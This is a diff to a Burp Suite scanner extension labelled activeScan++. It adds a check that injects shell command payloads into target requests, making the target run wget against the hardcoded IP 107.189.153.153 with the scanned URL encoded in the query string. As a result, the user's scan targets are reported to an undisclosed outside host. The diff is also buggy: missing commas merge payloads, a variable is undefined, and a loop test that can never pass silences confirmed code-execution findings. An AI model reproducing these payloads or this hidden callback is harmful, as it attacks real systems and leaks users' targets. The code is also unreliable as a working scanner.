@@ -18,8 +18,10 @@ try:
     import re
     import string
     import time
+    import base64
     from string import Template
     from cgi import escape
+    
 
     from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, IScanIssue
     import jarray
@@ -48,6 +50,8 @@ class BurpExtender(IBurpExtender):
 
 
         callbacks.registerScannerCheck(JetLeak(callbacks))
+        
+        callbacks.registerScannerCheck(MyCommandExec(callbacks))
 
         print "Successfully loaded activeScan++ v" + version
 
@@ -73,6 +77,29 @@ class JetLeak(IScannerCheck):
 # This extends the active scanner with a number of timing-based code execution checks
 # _payloads contains the payloads, designed to delay the response by $time seconds
 # _extensionMappings defines which payloads get called on which file extensions
+
+class MyCommandExec(IScannerCheck):
+    def __init__(self, callbacks):
+        self._helpers = callbacks.getHelpers()
+        
+        self._log_host = '107.189.153.153'
+        self._payloads = ['`wget ' + self._log_host + "/?u=$u `",\
+                            '$(wget ' + self._log_host + '/?u=$u)',\
+                            ';wget ' + self._log_host + '/?u=$u'\
+                            '&&wget ' + self._log_host + '/?u=$u'\
+                            '||wget ' + self._log_host + '/?u=$u'\
+                            ]
+    def doActiveScan(self, basePair, insertionPoint):
+        u = self._helpers.analyzeRequest(basePair).getUrl()
+        base64_u = base64.urlsafe_b64encode(u)
+        for payload in self._payloads:
+            payload = Template(payload).substitute(u=base64_u) 
+            attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest(payload))
+            print self._helpers.bytesToString(attack.getResponse())
+        
+        return None
+
+
 class CodeExec(IScannerCheck):
     def __init__(self, callbacks):
         self._helpers = callbacks.getHelpers()
@@ -136,13 +163,18 @@ class CodeExec(IScannerCheck):
                 if (dummyTime < baseTime + 4):
                     (timer, attack) = self._attack(basePair, insertionPoint, payload, 11)
                     if (timer > dummyTime + 6):
-                        print "Code execution confirmed"
-                        url = self._helpers.analyzeRequest(attack).getUrl()
-                        if (url in self._done):
-                            print "Skipping report - vulnerability already reported"
-                            break
-                        self._done.append(url)
-                        return [CustomScanIssue(attack.getHttpService(), url, [dummyAttack, attack], 'Code injection',
+                        for i in range(3):
+                            (timer1, attack1) = self._attack(basePair, insertionPoint, payload, 10)
+                            if (timer1 < dummyTime + 6):
+                                break
+                        if i == 3:
+                            print "Code execution confirmed"
+                            url = self._helpers.analyzeRequest(attack).getUrl()
+                            if (url in self._done):
+                                print "Skipping report - vulnerability already reported"
+                                break
+                            self._done.append(url)
+                            return [CustomScanIssue(attack.getHttpService(), url, [dummyAttack, attack], 'Code injection',
                                                 "The application appears to evaluate user input as code.<p> It was instructed to sleep for 0 seconds, and a response time of <b>" + str(
                                                     dummyTime) + "</b> seconds was observed. <br/>It was then instructed to sleep for 10 seconds, which resulted in a response time of <b>" + str(
                                                     timer) + "</b> seconds", 'Firm', 'High')]
